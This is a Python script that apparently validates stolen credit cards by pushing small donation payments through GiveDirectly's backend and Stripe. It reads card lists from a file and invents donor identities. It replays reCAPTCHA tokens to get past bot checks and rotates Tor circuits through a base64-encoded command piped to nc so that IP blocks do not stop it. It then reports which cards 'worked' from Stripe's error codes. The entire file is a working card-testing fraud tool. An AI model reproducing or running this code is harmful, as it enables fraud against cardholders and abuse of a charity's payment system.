from urllib.parse import urlencode
import requests
import regex
from bs4 import BeautifulSoup
import json
import socks
import socket
import os



inputs = input('Enter File Path : ')

if 'txt' not in inputs:
    file_open = inputs+'.txt'
else:
    file_open = inputs

with open(file_open,'r') as file:
    cards = file.read().split('\n')
    
    for card in cards:
        try:
          lista = card.split('|')
          srt2 = requests.get('https://randomuser.me/api?nat=us')
          srt = srt2.text
          data = json.loads(srt)
          email = data["results"][0]["email"]
          first = data["results"][0]["name"]["first"]
          last = data["results"][0]["name"]["last"]

          o = os.system("echo QVVUSEVOVElDQVRFICJkaHJ1diINCnNpZ25hbCBORVdOWU0NClFVSVQK | base64 -d | nc 127.0.0.1 9051 1>/dev/null")
          socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
          socket.socket = socks.socksocket
          input_string = requests.get('https://www.google.com/recaptcha/api2/anchor?ar=2&k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa&co=aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.&hl=en&v=pCoGBhjs9s8EhFOHJFe8cqis&size=invisible&cb=wtef4lvtnlmf')
          html = input_string.text
          expyear = lista[2][2]
          expyear2 =  lista[2][3]
          expyear3 = expyear+expyear2
# getting recaptia token value
          soup = BeautifulSoup(html, 'html.parser')
          recaptcha_token_input = soup.find('input', id='recaptcha-token')
          token = recaptcha_token_input['value']


          api_url = "https://m.stripe.com/6"
          dd = ''

          ms = requests.post(api_url , dd)
          tf = ms.text
          
          tx = json.loads(tf)
          guid = tx['guid']
          muid = tx['muid']
          sid = tx['sid']
          # guid = "NA"
          # muid = "NA"
          # sid =   "NA"
          url = 'https://www.google.com/recaptcha/api2/reload?k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa'
          data = {
              "v": "pCoGBhjs9s8EhFOHJFe8cqis",
              "k": "6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa",
              "reason": "q",
              "c": token, 
              "co": "aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.",
              "hl": "en",
              "size": "invisible",
              "chr": "%5B79%2C17%2C39%5D",
              "vh": "19287791902",
              "bg": "3tig2N0KAAQVCIdpbQEHnAbQ-_ld0wKQtuUGdgz48tMdDG6Y37QSVQk6saWxLfzmLQ5n-wnTHIukPYy-zt1XevEoVPWoFpnmZ-i6-qXpwbOeWrOSuEY12k7KPqJIuX43u3MNY6yz34uOcOcUKo2TbasUbkdS-PbYSN3A64RjZORV6JhpMdgZE0NOh8m5ssYkkefHJVLzzzyC2qZrMw5E3bWfbwqQAwY5vyzhqPHDO649RbxxsuLnfFTmXhL2xRZREFtasghBUoP9XF5aUw8IlGtYcDsxqPFcpw8-Jl_34aZeS40Ot830hrxvjGjVFnraz0iKuvN4V65CA_CLyzprxBVXttv-KhKVsspHMhEJ5npvyhmsEkLJA_DYP1eyU1tDcPMcjhbN_WFLgkvfiXC995iE-pi2GdaWHgY7-3VP19CR_gNCyUZ2FAn9UFf4z6vkDe9hkiC3kXLWsjrVEiwV79DDDaHSIQ9dKaNOVzckZhX4A-YeYPfBiZSQ22y7Lwmsyw3xkt1rqF5gL_eFUNXQfbi4u18ZvkFkixLnUvnpG-ZG1WuzEFb34NchNmb-3pWIrjpnV4ANlhsYTkSZiGwzdXiaVKoklBuBL01666y0H7Ie7A9oMHYyWmn1oMrt0_pEWRwr8BPQVNEULIqe0QGa6u6JMrPZ8IIKpBa4LSPRxempn2kSX1QaFqqsNrQUr6a4RiM4-RxPg4ZJwdfuIxDYNY5ywFIRrUHFxz_VN7bmH9ipbdAINBL7J9l1xvh369GFYUpMw1uL8hhanqHqNPq58s73U8DOtLclMtHiQcgfizvVCkljGY3Db1OSxjQ5ySy_amva91ms4LwBWTJlcWKDOlDXiKWtGYYJrxj78Z5KNRodG05EJHgBBmYQU2nxA6RAVWC2Z7hzIIZ01NYvDrcDfrtag7a2qpy4RVQI5QlB6hhJrzek4uZSxcwV-xWKcvvmKjOyExcTJ-zNrJ5h-oVUgonI7PFd4GPD04yHJM6ifivohRVJOVtBHbYh1l2sdG4wnNdQrqgJta9aR8PMVmzB93ZxN5sJGZmNQJ1OLsOonYHd80YR3Bu8OzeweoMOmhIrk-j5_bMI483_l-roGZR8uDoekYl_1sJwwyQnhhgyBLqGw-xERL1oQrLw7Ls_Q3cgCAuZwVKr32fa1SlJYjWGPnX7TE72X82P9bCCHr2yNTJSzGFlPYUsk5tnEDxqw_fW27ZOu4zLdiyuAY1fpMHyx6-W9_9TY9jKtYn6pC5VnIZeZO_SG-NjDj2SsdgITHHOWfrM43cnECYuUVdKD_6H3OUoNTXfnkjzQ54kNxTmtbW1Iq4FNWFYPyi6MCpZU1mGusylxvrCJQdsG7oy3bSSRq47LTPwC3NFjE7twA9r-NOdQj7XOqNyAWLz_ebp7Dsp_r6Bkk9cPn0fBkNJw9tUFPOhchSPFFUO8yzteBviuwhVKQVC2RsTfPYF4SZg0snpmoVWqr2xYyakB9KLNZO_Rjroyr5o9_K2oYcAkqKVoWTQF3VvQn9X3QcR82F6qVomyLly4b3HJcX32cojip8ubD-xycaYKjWjFrynyCDRGl7rJTlmpIBoi098iGFUNwVBrbgbpjaaOsx-LA490Nl-OFf8JF0cWWcBd_MWlJeVsyGamzXMQMO8rJ9EbYwWhDwAJ3VEupsVgPG-EOefqN9AUP9m-IAhvVi4JWchxhr4i2fN-mils-F5zPzMQT9igGj3VOYcAjp500IdikQViZ1Xfg6aVH1nIuXbeZdTLgFQq3y3RJR1Fb23KoXMJkqBnAowzy5bctoNGpSLcCrDXxuX5g9G3OKYpr54rtvYdxyi80rOSUdRyJA_dszrbw2t-h2KVtvhAxu3Zp7A73eo0EPMVvL2uynAEaX0l4NrqeIgwwMKadjxRcvJ-u6eTqNUUTAGyGtuzaK04sJpuJ3ZzZ_NCzcVpYDarNHngydlsYJzfJreVWfat-Ebjg-ofUAJhi4xq2h18PArHDcSjrqzZUtGyGaKLAVaK2pAGJRz6zgSVSHdFpssKzvltHfriqN61WKVruAVFjfC4kWM4hlaC_IE7AjztE7Vf3R8xtKts2jYbN6YLQsiLsW1t7_q-ewQJjNbyDKF1AC-c7v3t2r9-dHzvi_hroHsZO9_MlAYJNfxOMq3oKVXJnMl8O415yU7OwhNenIXyRYfoktTL5LKYY6uk1HX2Dt6wuOGvhoWnrpUpJtSIz7l532yiQqOtLgYS3EtE2h2Yh0IK3qGk4zxfpxqROyYhcRKCzMwuFYkFJ7gtl5jVsk8IwnrJ7RpiaAqyOWxvsURMfv3KjzWGd2kLhKR7TYL8qLCwlv5PNgyqd9LTYDK4g",
}

          query_string = urlencode(data)
          head = {

            "accept" : "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://www.google.com",
            "user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0)",
            "pragma": "no-cache",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "referer": "https://www.google.com/recaptcha/api2/anchor?ar=2&k=6Lcq82YUAAAAAKuyvpuWfEhXnEKfMlPusRw8Z6Wa&co=aHR0cHM6Ly9kb25hdGUuZ2l2ZWRpcmVjdGx5Lm9yZzo0NDM.&hl=en&v=pCoGBhjs9s8EhFOHJFe8cqis&size=invisible&cb=wtef4lvtnlmf",
         
}

          resp = requests.post(url , data , headers=head)

          ff = resp.text

          pattern = r'\["rresp","(.*?)"'
          match = regex.search(pattern, ff)

          gcap = match.group(1)
	
          url2 = '	https://www-backend.givedirectly.org/payment-intent'
 
          data2 =  {      
                "cents" : 200,
                "frequency" : "once",
                "directDonationTo" : "unrestricted",
                "emailAddress" : email,
                "firstName" : first,
                "lastName" : last,
                "recaptchaResponse" : gcap ,
                "subscribeToEmailList" : True,
}

          jjdata = json.dumps(data2)

          head2 = {
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
                 "content-type" : "application/json"
 
}

          cliid = requests.post(url2 , jjdata , headers=head2)

          
          hh = cliid.text
          if 'rejected' in hh :
            print ('check ip request rejected ')
            exit()
          jk = json.loads(hh)

          cli = jk['clientSecret']
          pi = jk['paymentIntent']
          

          data3 = {
                          "payment_method_data[type]" : "card",
                          "payment_method_data[billing_details][name]" :"dh ff",
                          "payment_method_data[card][number]" : lista[0],
                          "payment_method_data[card][cvc]" : lista[3],
                          "payment_method_data[card][exp_month]": lista[1],
                          "payment_method_data[card][exp_year]":expyear3,
                          "payment_method_data[guid]" :guid,
                          "payment_method_data[muid]" :muid,
                          "payment_method_data[sid]" : sid,
                          "payment_method_data[pasted_fields]" : "number",
                          "payment_method_data[payment_user_agent]" : "stripe.js/09e54426b4; stripe-js-v3/09e54426b4;card-element",
                          "payment_method_data[time_on_page]" : "40265",
                          "expected_payment_method_type" : "card",
                          "use_stripe_sdk" : "true",
                          "client_secret" : cli ,
}
          data4 = urlencode(data3)

          urlst = 'https://api.stripe.com/v1/payment_intents/'+pi+'/confirm'

          strhead = {
    
                "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": "Basic cGtfbGl2ZV9CM2ltUGhwREFldzhSenVoYUtjbE40S2Q6Cg==",


}


          strresp = requests.post(urlst , data4 , headers=strhead)

          rr = strresp.text
          print(rr)
          
          data = json.loads(rr)
          code = data["error"]["code"]
          if 'card_declined' == code :
            print('card declined')
         
          elif 'rate_limit' == code:
            print('rate limited')
          elif "incorrect_cvc" == code or 'invalid_cvc' == code :
            print('cvc in incorrect, card worked')
            print(data)
          elif "invalid_expiry_month" == code:
            print('month is incorrect, card worked')
            print(data)
          elif "invalid_expiry_year" == code :
            print('invalid year . card worked')      
          else:
            print(data)
            print('else reason'+card+'check card')
        except Exception as e : 
          print(e)
